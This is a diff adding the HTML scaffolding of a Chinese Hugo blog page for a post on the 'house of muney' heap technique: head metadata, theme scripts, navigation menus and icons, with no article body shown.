@@ -1,0 +1,2007 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="zh-cn" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title> &middot; Tea</title>
+  <meta name="title" content=" &middot; Tea" />
+  
+  
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/house-of-muney/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.1f83b379bb661f98400cb369bafdd7a53b0589234ecec7c64628945bd2b2d57aba0f6faa3f75523c4df8dc0e41ac0c70aaa98f1b7d14d75a2a9d96b595bf6aae.css"
+    integrity="sha512-H4OzebtmH5hADLNpuv3XpTsFiSNOzsfGRiiUW9Ky1Xq6D2&#43;qP3VSPE343A5BrAxwqqmPG30U11oqnZa1lb9qrg==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.764eb2fe8d6a6b086c7c58f87d12c64fa79a7585117fc27eb53f688f80c287a6eff16277f9d186cd223a39ff700e294d64482834faece5e07ee0498fa042d056.js"
+    integrity="sha512-dk6y/o1qawhsfFj4fRLGT6eadYURf8J&#43;tT9oj4DCh6bv8WJ3&#43;dGGzSI6Of9wDilNZEgoNPrs5eB&#43;4EmPoELQVg==" data-copy="复制" data-copied="已复制"></script>
+  
+  
+  
+  <script src="/lib/zoom/zoom.min.3530c2657381259433194af312ec3d322a97a2ad85661810299757fe793b24c3b8e07ab97fa8e5cf96cff1208f271e75394b6eaa56c2e39e7e2c3ca49fb1921c.js" integrity="sha512-NTDCZXOBJZQzGUrzEuw9MiqXoq2FZhgQKZdX/nk7JMO44Hq5f6jlz5bP8SCPJx51OUtuqlbC455&#43;LDykn7GSHA=="></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/house-of-muney/">
+  <meta property="og:site_name" content="Tea">
+  <meta property="og:title" content="Tea">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Tea">
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "我的博客",
+    "name": "",
+    "headline": "",
+    
+    
+    "inLanguage": "zh-cn",
+    "url" : "http:\/\/localhost:1313\/posts\/pwn\/heap\/house-of-%E7%B3%BB%E5%88%97\/house-of-muney\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Tea"
+    },
+    
+    
+    
+    
+    
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "5908"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="Tea" />
+  
+  
+  
+  
+  <link href="https://github.com/K1r2-svg" rel="me" />
+  
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.03cb160e3cfdb2667a2e2c80d283bebcf63ff8bbc4b629c9ab2babf6fae1d0c07ad470edae783efa4fabda2ac01c58d60e63b98b3c336be8208460f08f4354f5.js" integrity="sha512-A8sWDjz9smZ6LiyA0oO&#43;vPY/&#43;LvEtinJqyur9vrh0MB61HDtrng&#43;&#43;k&#43;r2irAHFjWDmO5izwza&#43;gghGDwj0NU9Q=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>跳过正文</a>
+  </div>
+  
+  
+  <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
+  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3">
+    
+    
+    
+    <div>
+        <a href="/" class="flex">
+            <span class="sr-only">Tea</span>
+
+            
+            <img src="/img/blowfish_logo_transparent.png" width="1000" height="1000"
+                class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="Tea" />
+            
+
+        </a>
+    </div>
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Tea</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+
+            
+            
+             
+  <div>
+  <div class="cursor-pointer flex items-center nested-menu">
+    
+    <a  href="/posts/"   class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="我的博客">
+      文档
+    </a>
+    <span>
+      
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+    </span>
+  </div>
+  <div class="absolute menuhide">
+    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
+      <div class="flex flex-col space-y-3">
+        
+        <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <span  class="mr-1" >
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+          </span>
+          
+          <p class="text-sm font-sm" title="">
+            C/C++
+          </p>
+        </a>
+        
+        <a href="/posts/git/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="Git">
+            Git
+          </p>
+        </a>
+        
+        <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            OpenCV
+          </p>
+        </a>
+        
+        <a href="/posts/pwn/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="PWN">
+            PWN
+          </p>
+        </a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+            
+            
+  <a href="https://github.com/K1r2-svg"  target="_blank"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <span >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+    </span>
+    
+    <p class="text-base font-medium" title="">
+        
+    </p>
+</a>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class=" flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 md:hidden">
+
+        <label id="menu-button" class="block">
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li id="menu-close-button">
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                     
+  <li class="mt-1">
+    <a href="/posts/" class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="我的博客">
+            文档
+        </p>
+        <span>
+            
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+        </span>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <span  class="mr-1" >
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+        </span>
+        
+        <p class="text-sm font-small" title="">
+            C/C++
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/git/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="Git">
+            Git
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            OpenCV
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/pwn/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="PWN">
+            PWN
+        </p>
+    </a>
+</li>
+
+<li class="mb-2"></li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="https://github.com/K1r2-svg"  target="_blank"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <div >
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+        </div>
+        
+        <p class="text-bg font-bg" title="">
+            
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  </div>
+</div>
+<script>
+  window.addEventListener('scroll', function (e) {
+    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+    var background_blur = document.getElementById('menu-blur');
+    background_blur.style.opacity = (scroll / 300);
+  });
+</script>
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+ 
+  
+   
+  
+ 
+
+
+
+<div id="hero" class="h-[150px] md:h-[200px]"></div>
+
+
+
+    
+    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url(/img/background.svg);">
+    
+
+
+    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
+    </div>
+    <div
+        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
+    </div>
+</div>
+
+<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+<script>
+    window.addEventListener('scroll', function (e) {
+        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+        var background_blur = document.getElementById('background-blur');
+        background_blur.style.opacity = (scroll / 300)
+    });
+</script>
+
+  
